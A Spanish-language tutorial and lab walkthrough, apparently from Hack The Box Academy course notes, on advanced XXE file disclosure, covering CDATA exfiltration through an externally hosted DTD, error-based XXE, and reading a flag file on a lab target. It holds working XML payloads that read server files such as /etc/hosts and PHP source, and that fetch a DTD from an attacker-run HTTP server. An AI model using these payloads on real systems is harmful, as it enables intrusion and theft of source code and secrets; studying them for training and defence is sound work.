
# Advanced File Disclosure

## <mark style="color:purple;">Divulgación avanzada de archivos</mark>

No todas las vulnerabilidades XXE pueden ser fáciles de explotar, como hemos visto en la sección anterior. Algunos formatos de archivo pueden no ser legibles a través de XXE básico, mientras que en otros casos, la aplicación web puede no generar ningún valor de entrada en algunas instancias, por lo que podemos intentar forzarla a través de errores.

***

## <mark style="color:purple;">Exfiltración avanzada con CDATA</mark>

En la sección anterior, vimos cómo podríamos usar filtros PHP para codificar archivos fuente PHP, de modo que no rompieran el formato XML cuando se hiciera referencia a ellos, lo que (como vimos) nos impedía leer estos archivos. Pero ¿qué sucede con otros tipos de aplicaciones web? Podemos utilizar otro método para extraer cualquier tipo de datos (incluidos los datos binarios) para cualquier backend de aplicación web. Para generar datos que no se ajusten al formato XML, podemos envolver el contenido de la referencia de archivo externo con una etiqueta `CDATA` (por ejemplo, `<![CDATA[ FILE_CONTENT ]]>`). De esta manera, el analizador XML consideraría esta parte como datos sin procesar, que pueden contener cualquier tipo de datos, incluidos caracteres especiales.

Una forma sencilla de abordar este problema sería definir una entidad interna que `inicie` con `<![CDATA[`, y que `finalice` con `]]>`, y luego colocar nuestro archivo de entidad externa en el medio, y debería considerarse como un elemento `CDATA`, de la siguiente manera:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

Después de eso, si hacemos referencia a la entidad `&joined;`, debería contener nuestros datos escapados. Sin embargo, esto no funcionará, ya que XML impide unir entidades internas y externas. Tendremos que encontrar una mejor manera de hacerlo.

Para evitar esta limitación, podemos utilizar `Entidades de parámetros XML`, un tipo especial de entidad que comienza con un carácter `%` y solo se puede utilizar dentro de la DTD. Lo que es único acerca de las entidades de parámetros es que si hacemos referencia a ellas desde una fuente externa (por ejemplo, nuestro propio servidor), entonces todas ellas se considerarán externas y se pueden unir, de la siguiente manera:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Entonces, intentemos leer el archivo `submitDetails.php` almacenando primero la línea anterior en un archivo DTD (por ejemplo `xxe.dtd`), alojándolo en nuestra máquina y luego haciendo referencia a él como una entidad externa en la aplicación web de destino, de la siguiente manera:

```shell-session
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora, podemos referenciar nuestra entidad externa ( `xxe.dtd`) y luego imprimir la entidad `&joined;` que definimos anteriormente, que debe contener el contenido del archivo `submitDetails.php`, de la siguiente manera:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- agrega el inicio de la etiqueta CDATA -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- referencia un archivo externo -->
  <!ENTITY % end "]]>"> <!-- agrega el final de la etiqueta CDATA -->
  <!ENTITY % xxe SYSTEM "http://NUESTRA_IP:8000/xxe.dtd"> <!-- referencia nuestra DTD externa -->
  %xxe;
]>
...
<email>&joined;</email> <!-- referencia la entidad &joined; para imprimir el contenido del archivo -->
```

Una vez que escribimos nuestro archivo `xxe.dtd`, lo alojamos en nuestra máquina y luego agregamos las líneas anteriores a nuestra solicitud HTTP a la aplicación web vulnerable, finalmente podemos obtener el contenido del archivo `submitDetails.php`:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg" alt=""><figcaption></figcaption></figure>

Como podemos ver, pudimos obtener el código fuente del archivo sin necesidad de codificarlo a base64, lo que ahorra mucho tiempo al revisar varios archivos para buscar secretos y contraseñas.

{% hint style="info" %}
**Nota**: En algunos servidores web modernos, es posible que no podamos leer algunos archivos (como index.php), ya que el servidor web estaría evitando un ataque DOS causado por una autorreferencia de archivo/entidad (es decir, bucle de referencia de entidad XML), como se mencionó en la sección anterior.
{% endhint %}

Este truco puede resultar muy útil cuando el método XXE básico no funciona o cuando se trabaja con otros marcos de desarrollo web. Intente utilizar este truco para leer otros archivos.

***

## <mark style="color:purple;">XXE basado en errores</mark>

Otra situación en la que nos podemos encontrar es aquella en la que la aplicación web no escribe ninguna salida, por lo que no podemos controlar ninguna de las entidades de entrada XML para escribir su contenido. En tales casos, estaríamos ante una salida XML `blind` y, por lo tanto, no podríamos recuperar el contenido del archivo utilizando nuestros métodos habituales.

Si la aplicación web muestra errores de ejecución (por ejemplo, errores de PHP) y no tiene un manejo de excepciones adecuado para la entrada XML, entonces podemos usar esta falla para leer la salida del exploit XXE. Si la aplicación web no escribe la salida XML ni muestra ningún error, nos enfrentaríamos a una situación completamente ciega, que analizaremos en la siguiente sección.

Consideremos el ejercicio que tenemos en `/error` al final de esta sección, en el que ninguna de las entidades de entrada XML se muestra en la pantalla. Debido a esto, no tenemos ninguna entidad que podamos controlar para escribir el resultado del archivo. Primero, intentemos enviar datos XML con formato incorrecto y ver si la aplicación web muestra algún error. Para hacerlo, podemos eliminar cualquiera de las etiquetas de cierre, cambiar una de ellas para que no se cierre (por ejemplo, `<roo>` en lugar de `<root>`), o simplemente hacer referencia a una entidad no existente, de la siguiente manera:

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg" alt=""><figcaption></figcaption></figure>

Vemos que efectivamente provocamos que la aplicación web muestre un error y también revelamos el directorio del servidor web, que podemos usar para leer el código fuente de otros archivos. Ahora, podemos aprovechar esta falla para exfiltrar el contenido del archivo. Para ello, utilizaremos una técnica similar a la que utilizamos anteriormente. Primero, alojaremos un archivo DTD que contiene la siguiente carga útil:

```html
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

El payload anterior define la entidad de parámetro `file` y luego la une con una entidad que no existe. En nuestro ejercicio anterior, unimos tres cadenas. En este caso, `%nonExistingEntity;` no existe, por lo que la aplicación web arrojaría un error que indicaría que esta entidad no existe, junto con nuestra unión `%file;` como parte del error. Hay muchas otras variables que pueden causar un error, como una URL incorrecta o tener caracteres incorrectos en el archivo al que se hace referencia.

Ahora, podemos llamar a nuestro script DTD externo y luego hacer referencia a la entidad `error`, de la siguiente manera:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://NUESTRA_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Una vez que alojamos nuestro script DTD como lo hicimos anteriormente y enviamos el payload anterior como nuestros datos XML (sin necesidad de incluir ningún otro dato XML), obtendremos el contenido del archivo `/etc/hosts` de la siguiente manera:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg" alt=""><figcaption></figcaption></figure>

Este método también se puede utilizar para leer el código fuente de los archivos. Todo lo que tenemos que hacer es cambiar el nombre del archivo en nuestro script DTD para que apunte al archivo que queremos leer (por ejemplo, `"file:///var/www/html/submitDetails.php"`). Sin embargo, este método no es tan confiable como el método anterior para leer archivos fuente , ya que puede tener limitaciones de longitud y ciertos caracteres especiales aún pueden romperlo.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.33.87
```

Utilice cualquiera de los métodos de esta sección para leer la flag en `/flag.php`

<figure><img src="/files/yAEsFzkiZEW6fd01pYUn" alt=""><figcaption></figcaption></figure>

### Método CDATA

Entonces, intentemos leer el archivo `flag.php` almacenando almacenando las siguiente líneas en un archivo DTD (por ejemplo `xxe.dtd`), alojándolo en nuestra máquina y luego haciendo referencia a él como una entidad externa en la aplicación web de destino, de la siguiente manera:

{% code title="xxe.dtd" %}

```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents 
'%start;%file;%end;'>">
```

{% endcode %}

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ python3 -m http.server 8000
</strong>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>

Ahora, podemos referenciar nuestra entidad externa ( `xxe.dtd`) y luego imprimir la entidad `&fileContents;` que definimos anteriormente:

```xml
<!DOCTYPE email [
  <!ENTITY % dtd SYSTEM
  "http://10.10.14.114:8000/xxe.dtd">
  %dtd;
  %all;
]>
...
<email>
&fileContents;
</email>
```

El enviar la petición obtenemos la flag sin problema:

<figure><img src="/files/WGN9rEUHf5DZRHv8rKCo" alt=""><figcaption></figcaption></figure>
